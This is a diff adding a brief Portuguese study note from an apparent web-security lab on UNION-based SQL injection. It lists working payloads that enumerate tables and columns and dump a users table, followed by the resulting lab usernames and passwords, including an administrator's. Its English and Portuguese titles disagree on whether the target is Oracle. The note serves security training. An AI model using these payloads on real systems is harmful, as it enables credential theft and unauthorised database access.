@@ -1,0 +1,29 @@
+_________________________________________________________________
+\\SQL injection attack, listing the database contents on Oracle//
+-----------------------------------------------------------------
+
+Laboratório: ataque de injeção de SQL, listando o conteúdo do banco de dados em bancos de dados não Oracle
+
+Testando com caracteres especiais
+'
+'-- |-> OK
+'#
+
+Verificando qual o banco de dados
+'UNION SELECT version(), NULL--
+
+Pegando tabelas do banco de dados:
+'UNION SELECT table_name, NULL FROM information_schema.tables--
+
+Pegando colunas das tabelas
+'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name="users_tdcdig"--
+username_frgseu
+password_sqomku
+
+'UNION SELECT username_frgseu, password_sqomku FROM users_tdcdig--
+wiener
+	td0jbdi61mnjczk5j6od
+carlos
+	t4t9e6yxfdvpkmw8cb5t
+administrator
+	n46ctfqfsxx4gvxif7ib
